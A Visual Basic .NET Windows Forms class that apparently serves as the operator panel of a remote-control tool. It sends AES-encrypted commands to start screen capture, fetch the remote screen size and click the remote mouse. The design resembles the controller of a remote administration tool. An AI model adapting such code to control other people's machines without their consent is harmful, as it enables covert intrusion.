Public Class RemoteDesktop
    Public connected As Connection
    Public pcwidth As Integer
    Public pcheight As Integer
    Dim mousex, mousey As Int32
    Public remotecontrol As Boolean = False
    Public first As Boolean = True
    Private Sub TrackBar1_Scroll(sender As Object, e As EventArgs) Handles TrackBar1.Scroll
        Label2.Text = String.Format("Quality ({0}%): ", TrackBar1.Value)
    End Sub
    Private Sub StartToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles StartToolStripMenuItem.Click
        connected.Send(New Encryption().AES_Encrypt("RD|" & TrackBar1.Value & "|" & checkres(), Form1.enckey))
        If first Then
            PictureBox1.SizeMode = PictureBoxSizeMode.CenterImage
            PictureBox1.Image = My.Resources._483
        End If
    End Sub
    Function checkres()
        If RadioButton1.Checked = True Then
            Return RadioButton1.Text
        ElseIf RadioButton2.Checked = True Then
            Return RadioButton2.Text
        Else
            Return RadioButton3.Text
        End If
    End Function
    Private Sub StopToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles StopToolStripMenuItem.Click
        connected.Send(New Encryption().AES_Encrypt("Stop", Form1.enckey))
        remotecontrol = False
    End Sub
    Private Sub PictureBox1_Click(sender As Object, e As MouseEventArgs) Handles PictureBox1.Click
        If remotecontrol = False Then Exit Sub
        Dim x As Integer = (pcwidth / PictureBox1.Size.Width) * mousex
        Dim y As Integer = (pcheight / PictureBox1.Size.Height) * mousey

        If e.Button = Windows.Forms.MouseButtons.Left Then
            connected.Send(New Encryption().AES_Encrypt("LeftSetCurPos" & x & "x" & y, Form1.enckey))
        ElseIf e.Button = Windows.Forms.MouseButtons.Right Then
            connected.Send(New Encryption().AES_Encrypt("RightSetCurPos" & x & "x" & y, Form1.enckey))
        End If
    End Sub
    Private Sub RemoteDesktop_FormClosing(sender As Object, e As FormClosingEventArgs) Handles Me.FormClosing
        If remotecontrol = True Then e.Cancel = True Else e.Cancel = False
    End Sub
    Private Sub RemoteDesktop_KeyDown(sender As Object, e As KeyEventArgs) Handles Me.KeyDown
        MsgBox(e.KeyCode.ToString())
    End Sub
    Private Sub RemoteDesktop_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        connected.Send(New Encryption().AES_Encrypt("GetPcBounds", Form1.enckey))
    End Sub
    Private Sub PictureBox1_MouseMove(sender As Object, e As MouseEventArgs) Handles PictureBox1.MouseMove
        MousePositionX0Y0ToolStripMenuItem.Text = "Mouse Position: X:" & e.X & " | Y:" & e.Y

        mousex = e.X
        mousey = e.Y
    End Sub
End Class